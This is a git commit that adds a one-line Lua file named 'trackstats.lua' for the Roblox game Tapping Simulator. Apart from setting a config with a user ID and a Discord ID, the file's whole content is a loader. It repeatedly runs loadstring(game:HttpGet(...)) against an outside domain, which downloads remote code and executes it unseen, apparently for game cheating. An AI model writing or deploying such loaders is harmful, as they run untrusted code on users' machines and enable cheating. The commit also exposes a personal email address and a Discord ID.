e3259fa3b6ac87c988f70cc1cafe24661d219c71
Duyy <anhhoangduy659@gmail.com>
2026-01-23 21:56:51 +0700

    a

---
+++ Tapping Simulator/trackstats.lua
@@ -0,0 +1,1 @@
+_G.Config={UserID="a7916749-0080-4d07-b4aa-3c4cb61484a1",discord_id="935143471243726858",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/ts"))()end)if s then break end wait(5)end
